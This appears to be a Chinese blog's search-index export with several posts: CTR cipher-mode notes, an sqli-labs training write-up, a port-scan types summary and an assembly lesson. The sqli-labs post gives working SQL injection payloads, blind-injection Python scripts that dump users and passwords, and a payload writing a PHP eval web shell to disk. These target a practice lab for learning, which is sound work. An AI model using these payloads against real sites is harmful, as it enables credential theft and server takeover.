738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(11435.9, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(11824.9, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(12602.6, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(13658.4, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(14281.2, 0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(15337, 0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(15937, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p>
<p><img src="https://gitee.com/auxein/images/raw/master/BlockCipher/CTR.png"><br>CTR表示计数器的初值。</p>
<ul>
<li>随机访问特性。可以随机的对任意一个密文分组进行解密，对该密文分组的处理与其他密文无关。</li>
<li>高效率。能并行处理，即能对多个分组的加解密同时进行处理，而不必等到前面分组处理完才开始。</li>
<li>CTR模式可以处理任意长度的数据。</li>
<li>CTR不需要实现解密算法。</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>sqlilabs注入笔记</title>
    <url>/2021/04/10/sqlilabs%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="基础挑战-1-20-关"><a href="#基础挑战-1-20-关" class="headerlink" title="基础挑战 1-20 关"></a>基础挑战 1-20 关</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>先判断能否注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 &#x2F;&#x2F;正常</span><br><span class="line">?id&#x3D;1&#39; and 1&#x3D;2 --+&#x2F;&#x2F;正常，为字符型注入</span><br></pre></td></tr></table></figure>

<p>确定是字符型后，判断列数，测试知列数为3</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 3--+</span><br></pre></td></tr></table></figure>

<p>判断数据显示点，id必须为0或负数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3--+</span><br></pre></td></tr></table></figure>

<p>显示登录的用户和数据库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,user(),database()--+</span><br></pre></td></tr></table></figure>

<p>得到用户名为<code>root@localhost</code>，数据库名为<code>security</code>，查看该数据库的所有表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),3--+</span><br></pre></td></tr></table></figure>
<p>得到的表名有<code>emails,referers,uagents,users</code><br>查看<code>users</code>表的列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;),3--+</span><br></pre></td></tr></table></figure>

<p>下面介绍一下<code>concat_ws()</code>的用法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">concat_ws()</span><br><span class="line">concat_ws(separator, str1, str2,...)</span><br></pre></td></tr></table></figure>

<p>它是一个特殊形式的<code>CONCAT()</code>。第一个参数separator是剩余参数间的分隔符。分隔符可以是与剩余参数一样的字符串。如果分隔符是 NULL，返回值也将为 NULL。这个函数会跳过分隔符参数后的任何 NULL 和空字符串。分隔符将被加到被连接的字符串之间。</p>
<p>举个栗子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WHERE concat_ws(&#39;-&#39;,year,month,day&#x3D;&#39;2018-08-09&#39;</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT CONCAT_WS(&quot;,&quot;,&quot;First name&quot;,&quot;Second name&quot;,&quot;Last Name&quot;);</span><br><span class="line">       -&gt; &#39;First name,Second name,Last Name&#39;</span><br><span class="line">mysql&gt; SELECT CONCAT_WS(&quot;,&quot;,&quot;First name&quot;,NULL,&quot;Last Name&quot;);</span><br><span class="line">       -&gt; &#39;First name,Last Name&#39;</span><br></pre></td></tr></table></figure>

<p>接着我们就利用它来查看账号和密码信息。<br>在刚才的注入后得到了<code>id,username,password</code>三个列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,(select group_concat(concat_ws(0x7e,username,password)) from users),3--+</span><br></pre></td></tr></table></figure>

<p><code>0x7e</code>对应的字符是<code>~</code>，这样就得到了所有的<code>username</code>和<code>password</code></p>
<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>判断注入类型，该题为数字型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;2-1 &#x2F;&#x2F;返回与1相同的结果</span><br></pre></td></tr></table></figure>

<p>其余的便与1相同了，此处不再赘述。需要注意的一点便是提交的<code>id</code>后不再需要<code>&#39;</code>来闭合</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,(select group_concat(concat_ws(0x7e,username,password)) from users),3--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>闭合类型不同</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;)--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先双引号 在括号拼接</span></span><br><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="literal">true</span>:</span><br><span class="line">    输出查询内容</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure>

<p>故payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot;)--+</span><br></pre></td></tr></table></figure>

<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>这道题我采用的是布尔盲注</p>
<p>首先猜解数据库长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if(length(database())&gt;5,1,NULL)--+</span><br></pre></td></tr></table></figure>

<p>if ((exp1, exp2, exp3)：为条件判断语句。当exp1的值为true时候，返回exp2，否则返回exp3。</p>
<p>我们可以通过修改<code>&gt;5</code>(<code>&gt;、=、&lt;</code>皆可)来确定数据库的长度，最后得到数据库长度为8，然后就可以写脚本来爆破数据库名了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080/sqlilabs/Less-5/?id=-1&#x27; or %s --+&quot;</span></span><br><span class="line">guess_str = <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line"></span><br><span class="line">database_payload = <span class="string">&quot;if(substring(hex((select database())), %d,1)=&#x27;%s&#x27;, 1,NULL)&quot;</span> <span class="comment">#通过if来判断数据库中的各字符</span></span><br><span class="line"><span class="comment"># substring(str, pos, len)：从pos位置取出str字符串的len个字符。</span></span><br><span class="line"><span class="comment"># 如select substring(‘abcde’, 4, 2)则返回de，pos为负则倒数pos个位置，如select substring(‘abcde’, -4, 2);返回bc。</span></span><br><span class="line">database=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 此处的代码是我们已经爆出了数据库名为&#x27;security&#x27;</span></span><br><span class="line">table_payload = <span class="string">&quot;if(substring(hex((select group_concat(TABLE_NAME) from information_schema.tables where TABLE_SCHEMA=&#x27;security&#x27;)), %d,1)=&#x27;%s&#x27;, 1,NULL)&quot;</span></span><br><span class="line"><span class="comment"># substring(</span></span><br><span class="line"><span class="comment"># hex(</span></span><br><span class="line"><span class="comment"># (</span></span><br><span class="line"><span class="comment"># select group_concat(TABLE_NAME) from information_schema.tables where TABLE_SCHEMA=&#x27;security&#x27;</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># , %d,1)</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>): <span class="comment">#数据库名长为8，但是转成了16进制，每两个字节表示一个字符，故此处为16</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> guess_str:</span><br><span class="line">        payload = database_payload % (i + <span class="number">1</span>, c) <span class="comment">#数据库中从1开始，遍历则从0开始</span></span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        r = s.get(url % payload).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> r: <span class="comment">#如果当前位的对应的字符猜解正确，则返回&#x27;You are in...........&#x27;</span></span><br><span class="line">            database += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(database))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>): <span class="comment">#此处不知道表名的个数，故采用了一个较大的数</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> guess_str:</span><br><span class="line">        payload = table_payload % (i + <span class="number">1</span>, c)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        r = s.get(url % payload).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="built_in">print</span>(c, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            table += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(table))</span><br><span class="line"></span><br><span class="line">column_payload = <span class="string">&quot;if(substring(hex((select group_concat(COLUMN_NAME) from information_schema.columns where TABLE_SCHEMA=&#x27;security&#x27; AND TABLE_NAME=&#x27;users&#x27;)), %d,1)=&#x27;%s&#x27;, 1,NULL)&quot;</span></span><br><span class="line">column = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> guess_str:</span><br><span class="line">        payload = column_payload % (i + <span class="number">1</span>, c)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        r = s.get(url % payload).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You are in...........&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="built_in">print</span>(c, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            column += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(column))</span><br></pre></td></tr></table></figure>
<p>题解2：<br>双注入需要count()、rand()、floor()这三个函数以及group by联合使用。<br>查数据库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union select 1,count(*),(select concat(floor(rand(0)*2),&#39;--&#39;,database())) as a  from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
<p>查表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union select 1,count(*),(select concat(floor(rand(0)*2),&#39;--&#39;,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; &#39;security&#39;))) as a  from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
<p>查字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union select 1,count(*),(select concat(floor(rand(0)*2),&#39;--&#39;,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; &#39;security&#39; and table_name&#x3D;&#39;users&#39;))) as a  from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure>
<p>查数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,count(*),concat(floor(rand(0)*2),&#39;--&#39;,(select concat(username,&#39;--&#39;,password) from users where id &#x3D; 1)) as x from users group by x%23</span><br></pre></td></tr></table></figure>

<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>闭合改变了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot; and if(length(database())&#x3D;8,1,NULL) --+</span><br></pre></td></tr></table></figure>

<p>上面的脚本略做修改即可使用</p>
<h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>判断闭合为<code>&#39;))&#39;</code>(ps：若闭合报错，则包含)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,2,&quot;&lt;?php eval($_GET[&#x27;</span>cmd<span class="string">&#x27;]);?&gt;&quot; into outfile &#x27;</span>c:<span class="operator">/</span>phpstudy<span class="operator">/</span>WWW<span class="operator">/</span>shell.php<span class="string">&#x27;%23</span></span><br></pre></td></tr></table></figure>

<p>然后蚁剑</p>
<h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>同Less-5</p>
<h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&quot;http://sqli-labs.lab/Less-9/?id=-1&#x27; or %s --+&quot;</span></span><br><span class="line">guess_str = <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line"></span><br><span class="line">database_payload = <span class="string">&quot;if(substring(hex((select database())), %d,1)=&#x27;%s&#x27;, sleep(1),1)&quot;</span> <span class="comment">#通过if来判断数据库中的各字符</span></span><br><span class="line"><span class="comment"># substring(str, pos, len)：从pos位置取出str字符串的len个字符。</span></span><br><span class="line"><span class="comment"># 如select substring(‘abcde’, 4, 2)则返回de，pos为负则倒数pos个位置，如select substring(‘abcde’, -4, 2);返回bc。</span></span><br><span class="line">database=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># for i in range(16): #数据库名长为8，但是转成了16进制，每两个字节表示一个字符，故此处为16</span></span><br><span class="line"><span class="comment">#     for c in guess_str:</span></span><br><span class="line"><span class="comment">#         payload = database_payload % (i + 1, c) #数据库中从1开始，遍历则从0开始</span></span><br><span class="line"><span class="comment">#         print(payload)</span></span><br><span class="line"><span class="comment">#         start = time.time()</span></span><br><span class="line"><span class="comment">#         r = s.get(url % payload).text</span></span><br><span class="line"><span class="comment">#         end=time.time()</span></span><br><span class="line"><span class="comment">#         if (end-start) &gt; 1: #如果当前位的对应的字符猜解正确，则返回&#x27;You are in...........&#x27;</span></span><br><span class="line"><span class="comment">#             database += c</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment"># print(binascii.unhexlify(database))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 此处的代码是我们已经爆出了数据库名为&#x27;security&#x27;</span></span><br><span class="line"><span class="comment"># table_payload = &quot;if(substring(hex((select group_concat(TABLE_NAME) from information_schema.tables where TABLE_SCHEMA=&#x27;security&#x27;)), %d,1)=&#x27;%s&#x27;, sleep(0.1),1)&quot;</span></span><br><span class="line"><span class="comment"># table = &quot;&quot;</span></span><br><span class="line"><span class="comment"># for i in range(100): #此处不知道表名的个数，故采用了一个较大的数</span></span><br><span class="line"><span class="comment">#     for c in guess_str:</span></span><br><span class="line"><span class="comment">#         payload = table_payload % (i + 1, c)</span></span><br><span class="line"><span class="comment">#         print(payload)</span></span><br><span class="line"><span class="comment">#         start = time.time()</span></span><br><span class="line"><span class="comment">#         r = s.get(url % payload).text</span></span><br><span class="line"><span class="comment">#         end = time.time()</span></span><br><span class="line"><span class="comment">#         print(end-start,end=&#x27;\n&#x27;)</span></span><br><span class="line"><span class="comment">#         if (end-start) &gt; 0.1:</span></span><br><span class="line"><span class="comment">#             table += c</span></span><br><span class="line"><span class="comment">#             break</span></span><br><span class="line"><span class="comment"># print(binascii.unhexlify(table))</span></span><br><span class="line"></span><br><span class="line">column_payload = <span class="string">&quot;if(substring(hex((select group_concat(COLUMN_NAME) from information_schema.columns where TABLE_SCHEMA=&#x27;security&#x27; AND TABLE_NAME=&#x27;users&#x27;)), %d,1)=&#x27;%s&#x27;, sleep(0.1),1)&quot;</span></span><br><span class="line">column = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> guess_str:</span><br><span class="line">        payload = column_payload % (i + <span class="number">1</span>, c)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        start = time.time()</span><br><span class="line">        r = s.get(url % payload).text</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> (end -start) &gt; <span class="number">0.1</span>:</span><br><span class="line">            <span class="built_in">print</span>(c, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            column += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(column))</span><br></pre></td></tr></table></figure>

<h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>测试闭合</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; and sleep(3)%23</span><br></pre></td></tr></table></figure>

<p>脚本同less-9</p>
]]></content>
  </entry>
  <entry>
    <title>常见端口扫描类型总结</title>
    <url>/2021/05/31/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="常见端口扫描类型总结"><a href="#常见端口扫描类型总结" class="headerlink" title="常见端口扫描类型总结"></a>常见端口扫描类型总结</h1><h2 id="TCP-SYN-扫描"><a href="#TCP-SYN-扫描" class="headerlink" title="TCP SYN 扫描"></a>TCP SYN 扫描</h2><p>原理：扫描器向目的主机的一个端口发送请求连接的SYN包，扫描器在收到SYN/ACK后，不采用发送ACK应答的方式而是发送RST请求断开连接，则三次握手不会完成，没有建立正常的TCP连接，此次扫描也不会被记录到系统日志中。这种扫描方式不会再目的主机上留下痕迹。但是这种扫描器需要有<strong>root权限</strong>。</p>
<ul>
<li>若收到SYN/ACK则端口开放</li>
<li>若收到RST表示端口关闭</li>
</ul>
<p>优点：扫描隐蔽。</p>
<h2 id="Connect扫描"><a href="#Connect扫描" class="headerlink" title="Connect扫描"></a>Connect扫描</h2><p>原理即为与TCP端口进行“三次握手”通信。</p>
<ul>
<li>若建立成功，端口开放</li>
<li>反之则关闭</li>
</ul>
<p>优点：实现简单，没有<strong>权限</strong>要求。并且扫描速度快，可同时打开多个套接字从而加速扫描。</p>
<p>缺点：会在目标主机的日志记录中留下<strong>痕迹</strong>，易被发现，并且数据包会被过滤。目标主机的logs文件会显示一连串的连接和连接出错的服务信息，并且能很快地使它关闭。</p>
<h2 id="NULL扫描（反向扫描）"><a href="#NULL扫描（反向扫描）" class="headerlink" title="NULL扫描（反向扫描）"></a>NULL扫描（反向扫描）</h2><p>原理：将一个没有设置任何标志位的数据包发给TCP端口。对于遵守FRC 793的主机（*nix）：</p>
<ul>
<li>端口关闭：舍弃该分段，并发送一个RST数据包。</li>
<li>端口开启：不会响应</li>
</ul>
<p>对于不遵循的主机，例如Windows主机，只要收到无标志位的数据包，无论端口开放还是关闭都响应RST数据包。</p>
<p><del>为什么称作反向扫描呢？与前两种相比，前两种方式收到响应包表示端口开放，而NULL扫描收到则表示端口关闭</del></p>
<p>优点：隐蔽性高，可粗略判断系统。</p>
<p>缺点：精确度相对较低。</p>
<h2 id="FIN扫描"><a href="#FIN扫描" class="headerlink" title="FIN扫描"></a>FIN扫描</h2><p>原理：FIN表示TCP会话结束，FIN扫描中发送一个设置了FIN位的数据包：</p>
<ul>
<li>响应RST数据包，端口关闭</li>
<li>无响应，端口关闭</li>
</ul>
<p>优点：隐蔽</p>
<p>缺点：不能判断Windows系统上端口开放情况</p>
<h2 id="ACK扫描"><a href="#ACK扫描" class="headerlink" title="ACK扫描"></a>ACK扫描</h2><p>原理：扫描主机向目标主机发送ACK数据包，根据返回的RST数据包可以得到端口信息。</p>
<ul>
<li>RST的TTL小于等于64，端口开放</li>
<li>反之关闭</li>
</ul>
<p>优点：隐蔽</p>
<h2 id="Xmas-Tree扫描"><a href="#Xmas-Tree扫描" class="headerlink" title="Xmas-Tree扫描"></a>Xmas-Tree扫描</h2><p>通过发送带有以下标志位的TCP数据包：</p>
<ul>
<li>URG：指示数据时紧急数据，应立即处理。</li>
<li>PSH：强制将数据压入缓冲区。</li>
<li>FIN：在结束TCP会话时使用。</li>
</ul>
<p>通常这三种标志位不能被同时设置。我们可以通过这种扫描来判断端口情况。</p>
<ul>
<li>无响应，端口开放</li>
<li>响应RST，端口关闭</li>
</ul>
<p>XMAS扫描原理和NULL扫描的类似，将TCP数据包中的ACK、FIN、RST、SYN、URG、PSH标志位置1后发送给目标主机。</p>
<p>优点：隐蔽</p>
<p>缺点：不能判断Windows系统上端口开放情况</p>
<h2 id="Dump扫描"><a href="#Dump扫描" class="headerlink" title="Dump扫描"></a>Dump扫描</h2><p>也被称为Idle扫描或反向扫描，在扫描主机时应用了第三方僵尸计算机扫描。由僵尸主机向目标主机发送SYN包。目标主机端口开放时响应SYN|ACK，关闭时返回RST，僵尸主机对SYN|ACK回应RST，对RST不做回应。从僵尸主机上进行扫描时，进行的是一个从本地计算机到僵尸主机的、连续的ping操作。查看僵尸主机返回的Echo响应的ID字段，能确定目标主机上哪些端口是开放的还是关闭的。</p>
<h2 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h2><p>原理：UDP为无连接协议。无连接的协议则不会事先建立客户端和服务器之间的通信信道，只要客户端到服务器存在可用信道，就会假设目标是可达的然后向对方发送数据。</p>
<ul>
<li>若响应，端口开放</li>
<li>返回ICMP目标不可达，端口关闭</li>
<li>如果服务器返回一个 ICMP 错误类型3且代码为1，2，3，9，10或13的数据包，则说明目标端口被服务器过滤了。</li>
<li>无响应，<strong>无法判断</strong><del>薛定谔的猫</del></li>
</ul>
<h2 id="分段扫描"><a href="#分段扫描" class="headerlink" title="分段扫描"></a>分段扫描</h2><p>原理：将一个完整的 TCP 报文分割封装到 2 个或多个 IP 报文，分别独立发送。</p>
<ul>
<li>关闭的端口响应。</li>
<li>无响应则开放</li>
</ul>
<p>优点：隐蔽性好，可穿越防火墙，</p>
<p>缺点：可能被丢弃，某些程序在处理这些小数据包时会出现异常。</p>
]]></content>
  </entry>
  <entry>
    <title>汇编语言学习（七）</title>
    <url>/2021/02/28/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89/</url>
    <content><![CDATA[<h1 id="汇编语言学习（七）"><a href="#汇编语言学习（七）" class="headerlink" title="汇编语言学习（七）"></a>汇编语言学习（七）</h1><h2 id="and和or指令"><a href="#and和or指令" class="headerlink" title="and和or指令"></a>and和or指令</h2><p>首先，介绍两条指令and和or。</p>
<ol>
<li>and指令：逻辑与指令，按位进行与运算</li>
</ol>
<p>例如指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov al,01100011B</span><br><span class="line">and al,00111011B</span><br></pre></td></tr></table></figure>

<p>执行后：<code>al=00100011B</code></p>
<p>通过该指令可将操作对象的相应位设为0，其他位不变。</p>
<p>例如：</p>
<p>将al的第6位设为0的指令是：<code>and al,10111111B</code><br>将al的第7位设为0的指令是：<code>and al,01111111B</code></p>
<p>注：与运算是逻辑乘，与1运算本身不改变。<code>1 and 1 = 1、1 and 0 = 0</code></p>
<ol start="2">
<li>or指令：逻辑或指令，按位进行或运算</li>
</ol>
<p>例如指令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov al,01100011B</span><br><span class="line">or al,00111011B</span><br></pre></td></tr></table></figure>

<p>执行后: al=01111011B</p>
<p>通过该指令可将操作对象相应位设为1，其他位不变</p>
<p>例如：</p>
<p>将al的第6位设为1的指令是：<code>or al,01000000B</code><br>将al的第7位设为1的指令是：<code>or al,10000000B</code></p>
<h2 id="以字符形式给出的数据"><a href="#以字符形式给出的数据" class="headerlink" title="以字符形式给出的数据"></a>以字符形式给出的数据</h2><p>我们可以在汇编程序中，用<code>......</code>的方式指明数据是以字符的形式给出的，编译器将它们转化为相对应的ASCII码。如下面的程序。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:code,ds:data</span><br><span class="line">data segment</span><br><span class="line">    db &#39;unIX&#39;</span><br><span class="line">    db &#39;foRK&#39;</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">    start: mov al,&#39;a&#39;</span><br><span class="line">           mov bl,&#39;b&#39;</span><br><span class="line">           mov ax,4c00h</span><br><span class="line">           int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p>在上面的源程序中：<br><code>db &#39;unIX&#39;</code>相当于<code>db 75H,6EH,49H,58H</code>，<code>u、n、I、X</code>的ASCII码分别为<code>75H、6EH、49H、58H</code></p>
<p><code>mov al,&#39;a&#39;</code>相当于<code>mov al,61H</code>，<code>a</code>的ASCII码为<code>61H</code></p>
<h2 id="大小写转换的问题"><a href="#大小写转换的问题" class="headerlink" title="大小写转换的问题"></a>大小写转换的问题</h2><p>下面考虑一个问题，在<code>codesg</code>中填写代码，将<code>datasg</code>中的第一个字符串转化为大写，第二个字符串转化为小写</p>
